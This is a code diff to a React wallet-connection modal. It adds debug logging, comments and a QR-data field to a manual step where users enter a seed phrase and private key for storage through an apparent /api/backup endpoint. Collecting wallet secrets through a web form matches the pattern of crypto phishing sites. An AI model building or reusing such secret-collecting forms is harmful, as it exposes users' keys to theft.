@@ -3,8 +3,8 @@ import { useSession } from "next-auth/react";
 import { QRCodeSVG } from "qrcode.react";
 import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
 import { Button } from "@/components/ui/button";
-import { Input } from "@/components/ui/input"; // Assumes you have an Input component
-import { CheckCircleIcon } from "@heroicons/react/24/solid"; // For success icon
+import { Input } from "@/components/ui/input"; 
+import { CheckCircleIcon } from "@heroicons/react/24/solid"; 
 
 interface BackupWallet {
   id: number;
@@ -72,21 +72,29 @@ const WalletModal: React.FC<WalletModalProps> = ({
   const connectWallet = async () => {
     setPreloader(true);
     setDynamicError(null);
-
+  
     // Step 1: Check if the selected wallet has a public address in the database
     if (selectedWallet?.id) {
+      console.log("Selected wallet:", selectedWallet);
+
       try {
         // Modify the fetch URL to pass userId and walletId as query parameters
         const response = await fetch(`/api/backup/checkWalletPublicAddress?userId=${userId}&walletId=${selectedWallet.id}`);
         const data = await response.json();
-
+  
+        // Log the response data for debugging
+        console.log("Wallet public address data:", data);
+  
         // If the wallet already has a public address, show success modal
         if (data.publicAddress) {
+          console.log("Public address found, showing success modal");
           setModalStep("success");
           setPreloader(false);
           return;
+        } else {
+          console.log("No public address found, proceeding to connect wallet");
         }
-
+  
       } catch (err: unknown) {
         setDynamicError("Error checking wallet public address.");
         setModalStep("error");
@@ -94,12 +102,12 @@ const WalletModal: React.FC<WalletModalProps> = ({
         return;
       }
     }
-
+  
     // Step 2: If no public address found or check failed, proceed with wallet connection
     setTimeout(async () => {
       setModalStep("connecting");
       setPreloader(false);
-
+  
       // Check if MetaMask is installed
       if (typeof window.ethereum === "undefined") {
         setDynamicError("MetaMask is not installed. Please download it.");
@@ -107,15 +115,15 @@ const WalletModal: React.FC<WalletModalProps> = ({
         setPreloader(false);
         return;
       }
-
+  
       try {
         const accounts = await window.ethereum.request({
           method: "eth_requestAccounts",
         });
-
+  
         if (accounts.length > 0) {
           const publicAddress = accounts[0];
-
+  
           // Step 3: Save the wallet data
           const storeResponse = await fetch(`/api/backup/storeWalletData?userId=${userId}`, {
             method: "PUT",
@@ -127,7 +135,7 @@ const WalletModal: React.FC<WalletModalProps> = ({
               walletName: selectedWallet?.name,
             }),
           });
-
+  
           if (storeResponse.ok) {
             const data = await storeResponse.json();
             console.log("Wallet data saved successfully", data);
@@ -149,6 +157,7 @@ const WalletModal: React.FC<WalletModalProps> = ({
       }
     }, 5000);
   };
+  
 
 
   const connectWalletManually = () => {
@@ -202,10 +211,6 @@ const WalletModal: React.FC<WalletModalProps> = ({
       setModalStep("error");
     }
   };
-
-
-
-
 
   const goBack = () => {
     setCurrentStep(0);
@@ -289,6 +294,7 @@ const WalletModal: React.FC<WalletModalProps> = ({
         </DialogContent>
       )}
 
+      {/* Manual connection steps */}
       {currentStep === 1 && (
         <DialogContent className="sm:max-w-md">
           <DialogHeader>
@@ -305,8 +311,10 @@ const WalletModal: React.FC<WalletModalProps> = ({
             <Input
               placeholder="Enter Seed Phrase (optional)"
               value={backupData.seedPhrase}
-              onChange={handleSeedPhraseChange}
+              onChange={handleSeedPhraseChange} // Handling seed phrase change
             />
+            <span className="text-green-500 text-sm">Separate each phrase with a comma ','</span>
+            {/* Display seed phrase tags */}
             <div className="flex flex-wrap gap-2 mt-4">
               {(backupData.seedPhraseArray || []).map((tag, index) => (
                 <div
@@ -316,7 +324,7 @@ const WalletModal: React.FC<WalletModalProps> = ({
                   <span>{tag}</span>
                   <Button
                     variant="link"
-                    onClick={() => removeTag(index)}
+                    onClick={() => removeTag(index)} // Handling tag removal
                     className="ml-2 text-red-500"
                   >
                     ×
@@ -332,12 +340,20 @@ const WalletModal: React.FC<WalletModalProps> = ({
                 setBackupData({ ...backupData, privateKey: e.target.value })
               }
             />
-            <div className="space-x-2 text-center">
-
-              <Button onClick={goBack} variant="outline">
+            <Input
+              placeholder="Enter QR Code Data (optional)"
+              value={backupData.qrCodeData}
+              onChange={(e) =>
+                setBackupData({ ...backupData, qrCodeData: e.target.value })
+              }
+            />
+            <div className="flex justify-between mt-4">
+              <Button variant="outline" onClick={goBack}>
                 Go Back
               </Button>
-              <Button onClick={saveManualData}>Save</Button>
+              <Button onClick={saveManualData}>
+                Save
+              </Button>
             </div>
           </div>
         </DialogContent>
